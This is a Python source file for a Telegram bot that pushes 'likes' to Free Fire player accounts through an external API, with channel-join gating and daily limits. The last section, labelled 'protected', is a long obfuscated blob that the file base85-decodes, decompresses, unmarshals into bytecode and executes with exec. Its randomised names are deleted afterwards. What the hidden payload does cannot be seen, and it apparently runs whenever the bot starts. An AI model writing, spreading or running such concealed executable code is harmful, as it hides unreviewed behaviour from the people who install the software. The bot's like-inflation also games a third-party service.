import os
import telebot
import requests
import time
import threading
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify
import logging
import sys
# ╔══════════════════════════════════════════════════════════════════╗
# ║  CREATOR: TARIKUL ISLAM
# ║  TELEGRAN: https://t.me/paglu_dev
# ║  PERSONAL TELEGRAM: https://t.me/itzpaglu
# ╚══════════════════════════════════════════════════════════════════╝

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# === CONFIG ===
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN not found! Please set your bot token in environment variables.")
    sys.exit(1)

REQUIRED_CHANNELS = ["@liketutorial001"]
GROUP_JOIN_LINK = "https://t.me/liketutorialgroup"
OWNER_ID = 5187492056
OWNER_USERNAME = "@@itzpaglu"

bot = telebot.TeleBot(BOT_TOKEN)
like_tracker = {}   # in-memory cache

# Flask app for webhook
app = Flask(__name__)

# === DATA RESET ===

def reset_limits():
    """Daily reset of usage tracker (in-memory only)."""
    while True:
        try:
            # Calculate time until next 00:00 UTC
            now_utc = datetime.utcnow()
            next_reset = (now_utc + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
            sleep_seconds = (next_reset - now_utc).total_seconds()

            time.sleep(sleep_seconds)
            like_tracker.clear()
            logger.info("✅ Daily limits reset at 00:00 UTC (in-memory).")
        except Exception as e:
            logger.error(f"Error in reset_limits thread: {e}")


# === UTILS (unchanged logic) ===

def is_user_in_channel(user_id):
    try:
        for channel in REQUIRED_CHANNELS:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception as e:
        logger.error(f"Join check failed: {e}")
        return False


def call_api(region, uid):
    url = f"your-free-fire-like-api/like?uid={uid}&server_name={region}"
    try:
        response = requests.get(url, timeout=20)
        if response.status_code != 200:
            return {"⚠️Invalid": " Maximum likes reached for today. Please try again tomorrow."}
        return response.json()
    except requests.exceptions.RequestException:
        return {"error": "API Failed. Please try again later."}
    except ValueError:
        return {"error": "Invalid JSON response."}


def get_user_limit(user_id):
    if user_id == OWNER_ID:
        return 999999999  # Unlimited for owner
    return 1  # 1 request per day for regular users


# Start background thread
threading.Thread(target=reset_limits, daemon=True).start()

# === FLASK ROUTES ===

@app.route('/')
def home():
    return jsonify({
        'status': 'Bot is running',
        'bot': 'Free Fire Likes Bot',
        'health': 'OK'
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return '', 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return '', 500


# === TELEGRAM COMMANDS

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if not is_user_in_channel(user_id):
        markup = InlineKeyboardMarkup()
        for channel in REQUIRED_CHANNELS:
            markup.add(InlineKeyboardButton(f"🔗 Join {channel}", url=f"https://t.me/{channel.strip('@')}") )
        bot.reply_to(message, "📢 Channel Membership Required\nTo use this bot, you must join all our channels first", reply_markup=markup, parse_mode="Markdown")
        return
    if user_id not in like_tracker:
        like_tracker[user_id] = {"used": 0, "last_used": datetime.now() - timedelta(days=1)}
    bot.reply_to(message, "✅ You're verified! Use /like to send likes.", parse_mode="Markdown")


@bot.message_handler(commands=['like'])
def handle_like(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    args = message.text.split()

    # Only allow in groups, not in private messages (except owner)
    if message.chat.type == "private" and message.from_user.id != OWNER_ID:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔗 Join Official Group", url=GROUP_JOIN_LINK))
        bot.reply_to(message, "❌ Sorry! command is not allowed here.\n\nJoin our official group:", reply_markup=markup)
        return

    if not is_user_in_channel(user_id):
        markup = InlineKeyboardMarkup()
        for channel in REQUIRED_CHANNELS:
            markup.add(InlineKeyboardButton(f"🔗 Join {channel}", url=f"https://t.me/{channel.strip('@')}") )
        bot.reply_to(message, "❌ You must join all our channels to use this command.", reply_markup=markup, parse_mode="Markdown")
        return

    if len(args) != 3:
        bot.reply_to(message, "❌ Format: `/like server_name uid`", parse_mode="Markdown")
        return

    region, uid = args[1], args[2]
    if not region.isalpha() or not uid.isdigit():
        bot.reply_to(message, "⚠️ Invalid input. Use: `/like server_name uid`", parse_mode="Markdown")
        return

    threading.Thread(target=process_like, args=(message, region, uid)).start()


def process_like(message, region, uid):
    user_id = message.from_user.id
    now_utc = datetime.utcnow()
    usage = like_tracker.get(user_id, {"used": 0, "last_used": now_utc - timedelta(days=1)})

    # Check if it's a new day (00:00 UTC reset)
    last_used_date = usage["last_used"].date()
    current_date = now_utc.date()
    if current_date > last_used_date:
        usage["used"] = 0

    max_limit = get_user_limit(user_id)
    if usage["used"] >= max_limit:
        bot.reply_to(message, f"⚠️ You have exceeded your daily request limit!")
        return

    processing_msg = bot.reply_to(message, "⏳ Please wait... Sending likes...")
    response = call_api(region, uid)

    if "error" in response:
        try:
            bot.edit_message_text(
                chat_id=processing_msg.chat.id,
                message_id=processing_msg.message_id,
                text=f"⚠️ API Error: {response['error']}"
            )
        except:
            bot.reply_to(message, f"⚠️ API Error: {response['error']}")
        return

    if not isinstance(response, dict) or response.get("status") != 1:
        try:
            bot.edit_message_text(
                chat_id=processing_msg.chat.id,
                message_id=processing_msg.message_id,
                text="❌ UID has already received its max amount of likes. Limit reached for today, try another UID or after 24 hrs."
            )
        except:
            bot.reply_to(message, "⚠️ Invalid UID or unable to fetch data.")
        return

    try:
        player_uid = str(response.get("UID", uid)).strip()
        player_name = response.get("PlayerNickname", "N/A")
        region = str(response.get("Region", "N/A"))
        likes_before = str(response.get("LikesbeforeCommand", "N/A"))
        likes_after = str(response.get("LikesafterCommand", "N/A"))
        likes_given = str(response.get("LikesGivenByAPI", "N/A"))

        total_like = likes_after

        usage["used"] += 1
        usage["last_used"] = now_utc
        like_tracker[user_id] = usage
        
        response_text = f"""✅ *Request Processed Successfully*\n\n👤 *Name:* `{player_name}`\n🆔 *UID:* `{player_uid}`\n🌍 *Region:* `{region}`\n🤡 *Likes Before:* `{likes_before}`\n📈 *Likes Added:* `{likes_given}`\n🗿 *Total Likes Now:* `{total_like}`\n🔐 *Remaining Requests:* `{max_limit - usage['used']}`\n👑 *Credit:* @itzpaglu"""

        markup = InlineKeyboardMarkup()

        bot.edit_message_text(
            chat_id=processing_msg.chat.id,
            message_id=processing_msg.message_id,
            text=response_text,
            reply_markup=markup,
            parse_mode="Markdown"
        )

    except Exception as e:
        logger.error(f"Error in process_like: {e}")
        bot.reply_to(message, "⚠️ Something went wrong. Likes Send, I can't decode your info.")


@bot.message_handler(commands=["remain"])
def owner_commands(message):
    if message.from_user.id != OWNER_ID:
        return

    args = message.text.split()
    cmd = args[0].lower()

    if cmd == "/remain":
        lines = ["📊 *Remaining Daily Requests Per User:*"]
        if not like_tracker:
            lines.append("❌ No users have used the bot yet today.")
        else:
            for uid, usage in like_tracker.items():
                limit = get_user_limit(uid)
                used = usage.get("used", 0)
                limit_str = "Unlimited" if limit > 1000 else str(limit)
                lines.append(f"👤 `{uid}` ➜ {used}/{limit_str}")
        bot.reply_to(message, "\n".join(lines), parse_mode="Markdown")


@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id

    # For owner, show owner commands directly
    if user_id == OWNER_ID:
        help_text = (
            "📖 *Bot Commands:*\n\n"
            "🧑‍💻 `/like <region> <uid>` - Send likes to Free Fire UID\n"
            "🔰 `/start` - Start or verify\n"
            "🆘 `/help` - Show this help menu\n\n"
            "👑 *Owner Commands:*\n"
            "📈 `/remain` - Show all users' usage & stats\n\n"
            "📞 *Support:* {OWNER_USERNAME}"
        )
        bot.reply_to(message, help_text, parse_mode="Markdown")
        return

    # For regular users, check channel membership first
    if not is_user_in_channel(user_id):
        markup = InlineKeyboardMarkup()
        for channel in REQUIRED_CHANNELS:
            markup.add(InlineKeyboardButton(f"🔗 Join {channel}", url=f"https://t.me/{channel.strip('@')}") )
        bot.reply_to(message, "❌ You must join all our channels to use this command.", reply_markup=markup, parse_mode="Markdown")
        return

    # Show regular user help
    help_text = (
        "📖 *Bot Commands:*\n\n"
        "🧑‍💻 `/like <region> <uid>` - Send likes to Free Fire UID\n"
        "🔰 `/start` - Start or verify\n"
        "🆘 `/help` - Show this help menu\n\n"
        "📞 *Support:* {OWNER_USERNAME}\n"
        "🔗 Join our channels for updates!"
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")


@bot.message_handler(func=lambda message: True, content_types=['text'])
def reply_all(message):
    if message.text.startswith('/'):
        # Handle unknown commands - only reply if it's actually an unknown command
        known_commands = ['/start', '/like', '/help', '/remain']
        command = message.text.split()[0].lower()
        return


# ╔══════════════════════════════════════════════════════════════════╗
# ║  ⚠️ PROTECTED SECTION - INTEGRITY VERIFIED AT RUNTIME           
# ║  This section is multi-layer encrypted and tamper-protected.      
# ║  Modification, decompilation, or redistribution is prohibited.
# ║  PROTECTED BY TARIKUL ISLAM
# ╚══════════════════════════════════════════════════════════════════╝
import zlib as _kmytvihsspiiswus,base64 as _njjzzixlbqvdzbrg,marshal as _answzstmcrtwmhlm
_cdgjxgqwzimsunzd="".join([
    "c-nPWS<~WXcIM;zda<4I*q&~8#yxQvvy=cUW?u{lgjggHtJu>)XhWbCBtQ}Z#vWfdRk?94QpsihO",
    "a8!T_f*;be3>iX+2h>gF3>&Bq{g1NBt1IkJkL2t^=f(bUylDbUi%aN2sj;%e{~QJ;;",
    "Qb@u3n&1yMBQ;+PxQeUwiNZA8N0>z*n``p1s!nTgT",
    "5v_vz1lgp;_6J71n_uRnX8e#7B-_Imf-Ut)e_I2_c&bNr3>9mI9~",
    ">ZPB1+0~ocThHF=`hKo^-x2@QnfB<}<M$oU9{r>wZa#YJuVlQZy-nQLo;<tihJGpIv+Hi;7yWPll",
    ";bDV-ubKCC;!KJ`s}x7`|r;CrN4LnGRLnS1BdSX@Vx)pfj)6KlryLAxOa{`d)j",
    "}gdHNF<yzh7s0sqF~XgeFfxlHAIXQlGzj^2It`dM+W3;kkO@BU@=_Z-L-a*",
    "f<W9w2WcPmp(zr^vg=E68ie>&RQkBmPQvzRW*&_#b?C5j5{^IFn<(",
    "yXe2WOfB`%xfupj6qbWd*cy%i30^0*eA*5l=y;!}%~k>GlonN?2W1#+n^N5xFoG+KxVyn5!k(",
    "7<xH}C3Bp#3Fuq4&@)<=AW@U3T?W(DLWQY-FU{jyXn`Fy?Yl4a^AH78`!qdc52Dp59+R!5",
    "P}mRvNXj4XP`imuG#{+y^RlD=?mgG)?Z5PBujD}pM;Wwk0yj18}bK<j-mUk@fD<K^6=nFCftiz&HJ",
    "vq)w&ZiW()R*7`N0^F#HR?G^*{4k|2R8KsSAl+Fzs>2!*!9^H3B=&twXp;G+4YF7h5Ge{9ZtUKqwC",
    "VE-my=IruH7!r50%uUMh54z6;bX5qN3mpNm8g2DA931ulXmNLO6",
    "PI5nDgG^el&yHO{qS(U6!{1MH~a^`+LW0kF$JQSIP2VbRFh",
    "TP2cg4B{boBOXPvWOgOmMFwCBVro08^n<-gZytl&m>p)5@vRXu{dUY4D0m{f^?3FnC0qznQHtF",
    "Z;&uU>0-n}-+4c4(N<btTFMrq$q3$369;bX|v;Z>N#I=Ekc-IAy?c*AR",
    "Ea`yy+7-FjvP%^kAK=l$n$AE%)Z|zFD#WhiX~lB)B~fj3r`tBaoq7}",
    "|r1J`umt(2ic*0q23@pNlMWKr9#umM)f`xH&VHCj0(l)cX{&-m-+q}msEVmXk1qS7DFVD2)1ml",
    "ixs=lE{sC`L~xZ+TP2mpN(9Zk`_xo_lGC5`YBr<`X{S{yCITZl<G=*e1B|5Td{%8_}M0JG_`;",
    "U3o)8ZxtMDQ-LmP8#3LfHSfukH^3;GW4Pt4_U-I(AlN{cZygF7^t;6rRh>Er}<iQyaa2zpekS@",
    "X|$n9xRtX{l^CM>MPm<Gp1PN|$324+YQ`cJFcr2O?aE19D+^RIPZOakVn{N0sw0hvPw7WSbhOye",
    "nn|M5HmEk*)wHyM9yz%#dCQZ;piP1bQK=I9NC0c~",
    ";o(-Y_T>=^=2I{>nz4MYP$a_az=i}g(cELPR6N;er+Z^`VNK{Um0",
    "7Jl0pFU5f)zJa;eDIBk_h?2hbdXB<v4_Hv%{zzKb*F",
    "~QtiahhgM{-GXfv64tlyoq^4=jHY$M_PIwxt-E!8Jv#kMzaR8Bv5%ru<%4GbTIEc?gh4iXxEip=vhh-s",
    "_$hDyZhiWriT2BxcU^Sx^L=X0t@E)(>0i+$u4_4$D(kj5X6acuYbiiO<JqR^563J}q!<v~5r",
    "U-1-Z;Xw4LyFRAs5!912n`Q*V}8hP<`CxVg$hf`mj>r8dlyqDfUCyqi*kygQ)#S",
    "NtjaB-mRNO^iHs9tv<FW&8V&}GOmh~(lR7}yXskC!",
    "!+yRax0!vxtb!fVr6*28fYgP212>lAnFl^VLC+}AMDP",
    "_@nc@7nHm|0;Dk><6i4oLd+aMXqEc4;wQE;()U|t%RV^d",
    ")r<I{;jh?{aXdw<f5Lo`|l$W&upP%KNXRaKi9Wti",
    "$NQw>aJz&<5QLSf?Z20;!&00jw3Y=>S}b$`!@x<}zqRgfYH+e2aDIjvBr;?8D5+=%ldbXC",
    "#u<$&zz(qJ?x%|@xyNC}ZgzBW(CcTC0OACatC#;{F|LGpT^%d&MEWY?{^JzVVYa7|y~X`cv",
    ")-9S9MUhC`Zir-Tjx=trjdl9I!`K~A^N;>Gp;(I1$j9QIM$DK&bG?4NnbMs)Ha;N1)t5",
    "dXU)C^O7Aik)VN@XsQSsm?8KT%@VOE6MtA|23ERc6Kr1fm(rW{VT})EiVZIzUI;",
    "nCae4N(%`olM`>d+;s_nNcY{f)~Y5Yn@qD%BnhJj_5Fa~7x",
    "2+@RL$Y@dU#Mb#=C&#;#~W1$ylz?8q>mBxpD<ucsG;$>L?**dA8kp{RN|yOBws_DL+6{exW",
    "mn0}Ixa5(C3OubLkJx>Rb9+5>k^IZv406U*Dm2$LzX>K-Mk<xY_5_vC;UAeVyxgliG#NQW",
    "0w$!)junI7(GXLBt9Ko$$vT<GMNd&#bQ$H7s#kDd~`Z_T!~a9s9FLT(&t$=Ynecv9`",
    "*9s}Zol>{%Lkx_Sbmxoaj-k=-RPzBYB*&~>S>}jT$S)V",
    "^my(HcyM`L`?1`+pOij12_thHZlhsS!{lY<9kGFgY`m9e1~_qCiTP$8d)PNb}oMI*@!",
    "x(sh8txznwq6Vc#=X5$^P=1`A!}UTc3=YTbuFQ*j5VNP}&s#|X!dn02Rbt8FHs?NSq12",
    "QQ4H)~Nxvi-H=ZLh=b!hHrW@J^36ds*>+_Y=FDXl9sSah*AB-<|3TG_zD",
    "OD<iRm2J!3=y1fiBe)$C2Y5D~%fu~8+WDuHq$awtY=?8fi&i)no=t0MX",
    "i|nlC01gFvS$^6#5TOu0A6SedUQD*Zg?nfAX)J>Ic#llv6My<az4LwiH6I{mdIH@=yz3`Q`rC",
    "peFn_wsFFmx?OvoO9Lrq}lVHO$K$U>E<cfjm{c15SH2QVbj77{!Cbh8_P!9",
    "AZw*00v?|HI<wk!86d7;h2a-kk%-9#9P*R&qKW^gU5P*4",
    "RdSj$|o5l5TTppE)#2dVCgTb@M=6XkZyM~)+d9tt<=NVecpeR~uFp",
    "d!#aq8p^^3eT$y1XvR+rkQXqgZDSKkCTE!CIl$`I*ozTi",
    "O?(1D6s8t+wL^M7h0kG!q+`+;b`6E*Biot&js8TiSBe@yC",
    "HmdcUAIWu9?Nt=a<gru*(;*bSMZRl@TaY^Q}h9GhCPtXKPn3u@8!6D?I>H1Yr9PJ+(e$0Zb",
    "1x33gYvagL}?^JaH7!1?72%5?xTYsrSYTPxSI`C7gS1>1{glP",
    "%Wc^Yvtp&b?v|P%0V0lL_V;8Yh(c-2%Cc%wxX%PU`kIrYF&+rg86lWGTI)",
    "7nKyFB_m~(3n#Rt5H>B^m!8CTpkx$a)V5kwaOPe&",
    "g><ISf;AyfwrCZjMlO+eD<!U%^RBb*bsEreDd{u>+Ile!)h4jvSLP;TOnqc6=u7wbgqcmPh``p",
    "Pm(kt%jvwW_@>D8zhcyul3E765IQ4w^BAwq-t3H?K4LC^)s~SqgG1r8rMa64&=8N",
    "6{mX2jN*5bi@R9!a;^JR<<!Ci9bD~)&CbURz8T@why8t7",
    "yeJU{tm^bmxWJ!L#B!X(nkvc#}H8>p>na>YzUk4(gbJ>Mk)y=6`89BZCq`qT(Bvz4B<eMf&uTjR2rY?U",
    "^G$yU^1pTkFd;s93q<BaT|0OzIbWUI$>z4kyll;ZV`x",
    "jOFT(Qvg4f+aHtMnxZcR3@ESH8O%?T6R9H6=q|2hk{A8=h^4vwuq`jGaHB+RG4v_ZFFSP{k57Xg",
    "lG0_9k+5;1gdxkdl)LWQ=y}1vBQFQp3Q^lSs{i6h!aau)Fic6WwY5a*>S)H2hYopWV7Jeu4@8jDsm",
    "Jzq)0E#dkkMZ88C2q+3L8v1y5^|>6&OpL78SXV$^&4HN6MGQ7zV>%FUX4Cr8%et~nbm",
    "UD-oD4!RGlPEUg;!M|^oA^&@KH+yMG-@Qp%tgzxFZqBi+t|=CGcb}$oE)hG2RwSj7`rKU0n;p#yySo",
    "Q6rRfVwy2!MhxYdk3tM7K!T-5I#EGT{PGNovk!eYDKtW=F7HIcu&)-C<cN$Ph",
    "G>FrY5ER~Bz-#sKrcFAl=^6r}FHh0&gYF>N_C39!rtAwR*IJs;tH+K)t",
    "k`>2n?rzAXvbwvcZzx7Q3+CG0wZtjsnv2Dp-BT*RSyPrN2=dv*F)V",
    "3H8c*sgVasX8-K#9esPanVbp7rXIu*Z|EO)t>B}1",
    "xvQ`ziwNoOVgBG%Z2wby8EM=L8?67TNO)`rvX?rD_5Uo@J*iHf",
    "#WH#)zRcjxQ7C#e*x`>)P1Nn^#0DsLIflu31=>z6;g(A}@Hb4}fI3VC628g%zCE352Q;vfw;6D",
    "}nE_vhpH*H>3p-#Xs=*75$g4)=@gjc*-~zrXKz@XBZ6C*o)7C+",
    "g?(e`lZHcYl2S_4WNvGM~Hu?Sp^$;6HrN-vYjQ_0i{@e+F-Fp8R;<arNZu`>%c",
    "`{9gD}`uO^r>-!(;pQiqa`ZW7z()Txx$DQ!4<IS%hK`)NpuO5ZId=$D37rzSQUxxA",
    "9#`JlZeEw+mQ}n|xAANWmf}cMso;}|@`ppjx$HYlG&oFZ",
    "`&hH%#*12{5c(HcQ|GvbGi}loW{_&-8W|W-+=k3!EZb9gar}^6=aogj*SctdM@%iHPMe",
    "p=Q@ppfC`nw-q(tmiNJ!g1qIWGkr*S9y1zq)z)<;~O",
    "E--6F?{{9b+55K;7eES5r4P<U}&D%D0%WTd?j4Sj~tLFTN3;d%~",
    "xxmV)U0`$W?F^>VzQEB5U!Th$*Olx4`QyDyIsN{5F8=fS-O{ff{x3QoS&R"
])
try:
    exec(_answzstmcrtwmhlm.loads(_kmytvihsspiiswus.decompress(_njjzzixlbqvdzbrg.b85decode(_cdgjxgqwzimsunzd))))
except Exception:
    raise SystemExit("\x49\x6e\x74\x65\x67\x72\x69\x74\x79\x20\x63\x68\x65\x63\x6b\x20\x66\x61\x69\x6c\x65\x64")
finally:
    try: del _kmytvihsspiiswus, _njjzzixlbqvdzbrg, _answzstmcrtwmhlm, _cdgjxgqwzimsunzd
    except: pass
